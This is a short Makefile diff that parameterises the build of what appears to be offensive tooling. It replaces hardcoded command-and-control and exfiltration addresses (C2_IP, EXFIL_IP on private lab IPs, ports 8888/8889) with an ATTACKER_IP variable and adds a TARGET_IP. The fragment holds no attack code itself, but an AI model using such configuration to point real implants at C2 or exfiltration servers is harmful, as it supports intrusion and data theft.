@@ -1,8 +1,11 @@
+TARGET_IP ?= 10.37.1.248
+ATTACKER_IP ?= 10.37.1.249
 CXX = g++
+
 CXXFLAGS = -O2 -s \
-           -DC2_IP='"10.37.1.249"' \
+           -DC2_IP='"$(ATTACKER_IP)"' \
            -DC2_PORT=8888 \
-           -DEXFIL_IP='"10.37.1.249"' \
+           -DEXFIL_IP='"$(ATTACKER_IP)"' \
            -DEXFIL_PORT=8889
 LDFLAGS = -lssl -lcrypto
 
